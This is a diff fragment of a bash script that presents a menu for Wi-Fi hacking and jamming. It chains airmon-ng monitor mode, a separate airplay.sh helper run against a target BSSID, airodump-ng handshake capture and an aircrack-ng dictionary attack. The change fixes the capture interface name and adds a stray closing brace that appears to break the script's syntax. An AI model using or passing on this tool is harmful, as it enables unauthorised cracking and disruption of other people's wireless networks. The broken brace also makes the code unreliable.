@@ -34,6 +34,7 @@ echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 4)] $(tput setaf 4)Wifi
 echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 4)] $(tput setaf 4)Wifi Jammer"
 echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 4)] $(tput setaf 4)Exit\n\n$(tput setaf 7)"
 }
+}
 hacking () {
 airmon-ng start wlan0 > /dev/null
 trap "airmon-ng stop wlan0mon > /dev/null" EXIT
@@ -58,7 +59,7 @@ logo
 start
 hacking
 x-terminal-emulator -e ./airplay.sh $bssid
-airodump-ng --bssid $bssid --channel $ch cae -w files 
+airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
 aircrack-ng -w dictionary/dictionary.txt files-01.cap
 airmon-ng stop wlan0mon > /dev/null
 rm files*
